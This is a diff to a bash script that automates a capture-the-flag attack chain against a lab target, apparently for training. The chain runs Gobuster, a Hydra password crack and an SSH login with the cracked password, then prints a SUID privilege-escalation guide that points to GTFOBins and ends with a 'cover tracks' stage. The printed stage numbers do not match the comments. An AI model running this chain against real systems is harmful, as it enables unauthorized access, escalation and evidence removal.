@@ -32,7 +32,7 @@ if [[ $EUID -ne 0 ]]; then
 fi
 
 echo -e "${CYAN}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${RESET}"
-echo -e "${BOLD}${YELLOW}  Attack Chain: Gobuster → Hydra → SUID Escalation → Root${RESET}"
+echo -e "${BOLD}${YELLOW}  Attack Chain: Gobuster → Hydra → SSH → Escalation → Root${RESET}"
 echo -e "${CYAN}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${RESET}"
 echo ""
 
@@ -128,18 +128,43 @@ else
 fi
 
 # =============================================================
-# STAGE 4 — PRIVILEGE ESCALATION GUIDE
+# STAGE 4 — SSH INTO BLACKBOX
 # =============================================================
 echo ""
 echo -e "${CYAN}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${RESET}"
-echo -e "${BOLD}${MAGENTA}  STAGE 4 — Privilege Escalation (Manual)${RESET}"
+echo -e "${BOLD}${MAGENTA}  STAGE 3 — SSH Login${RESET}"
+echo -e "${CYAN}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${RESET}"
+echo ""
+echo -e "${YELLOW}[?] Enter cracked password from Hydra:${RESET}"
+read -r PASSWORD
+
+echo ""
+echo -e "  ${YELLOW}SSH Command :${RESET} ${BOLD}${CYAN}ssh $USERNAME@$TARGET -p $SSH_PORT${RESET}"
+echo ""
+echo -e "${YELLOW}[?] Connect now? ${BOLD}(y/n)${RESET}${YELLOW}:${RESET}"
+read -r SSH_CONFIRM
+
+if [[ "$SSH_CONFIRM" == "y" || "$SSH_CONFIRM" == "Y" ]]; then
+  echo ""
+  echo -e "${MAGENTA}[>] Connecting to $TARGET as $USERNAME...${RESET}"
+  echo -e "${YELLOW}    Do your manual steps inside, then type exit to return.${RESET}"
+  echo ""
+  ssh "$USERNAME"@"$TARGET" -p "$SSH_PORT"
+fi
+
+# =============================================================
+# STAGE 5 — PRIVILEGE ESCALATION GUIDE
+# =============================================================
+echo ""
+echo -e "${CYAN}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${RESET}"
+echo -e "${BOLD}${MAGENTA}  STAGE 4 — Privilege Escalation Reminder${RESET}"
 echo -e "${CYAN}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${RESET}"
 echo ""
 echo -e "  ${CYAN}►${RESET} ${BOLD}Step 1${RESET} — Find SUID binaries on the target:"
 echo -e "          ${YELLOW}find / -perm /4000 2>/dev/null${RESET}"
 echo ""
 echo -e "  ${CYAN}►${RESET} ${BOLD}Step 2${RESET} — Look for anything unusual in the list"
-echo -e "          Normal: ${GREEN}passwd, sudo, su${RESET}"
+echo -e "          Normal:     ${GREEN}passwd, sudo, su${RESET}"
 echo -e "          Suspicious: ${RED}nano, vim, find, python, bash${RESET}"
 echo ""
 echo -e "  ${CYAN}►${RESET} ${BOLD}Step 3${RESET} — Look up the suspicious binary on GTFOBins:"
@@ -151,7 +176,7 @@ echo -e "          ${YELLOW}find / -name flag.txt 2>/dev/null${RESET}"
 echo ""
 
 # =============================================================
-# STAGE 5 — COVER TRACKS REMINDER
+# STAGE 6 — COVER TRACKS REMINDER
 # =============================================================
 echo -e "${CYAN}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${RESET}"
 echo -e "${BOLD}${RED}  STAGE 5 — Cover Tracks (run before exit)${RESET}"
